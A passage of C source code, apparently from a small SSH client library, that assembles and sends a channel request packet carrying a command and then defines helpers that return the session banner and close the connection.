    pkt[pos++] = (uint8_t)(req_len >> 8); pkt[pos++] = (uint8_t)req_len;
    memcpy(pkt + pos, req, req_len); pos += (int)req_len;
    /* want_reply = false */
    pkt[pos++] = 0;
    /* command */
    pkt[pos++] = (uint8_t)(cmd_len >> 24); pkt[pos++] = (uint8_t)(cmd_len >> 16);
    pkt[pos++] = (uint8_t)(cmd_len >> 8); pkt[pos++] = (uint8_t)cmd_len;
    if (cmd_len + (uint32_t)pos > sizeof(pkt)) return -1;
    memcpy(pkt + pos, cmd, cmd_len); pos += (int)cmd_len;

    if (ssh_send_packet(s, pkt, pos) < 0) return -1;

    return 0;
}

const char *ssh_banner(ssh_session_t *s) {
    if (!s) return NULL;
    return s->banner;
}

void ssh_close(ssh_session_t *s) {
    if (!s) return;
    close(s->fd);
    free(s);
}
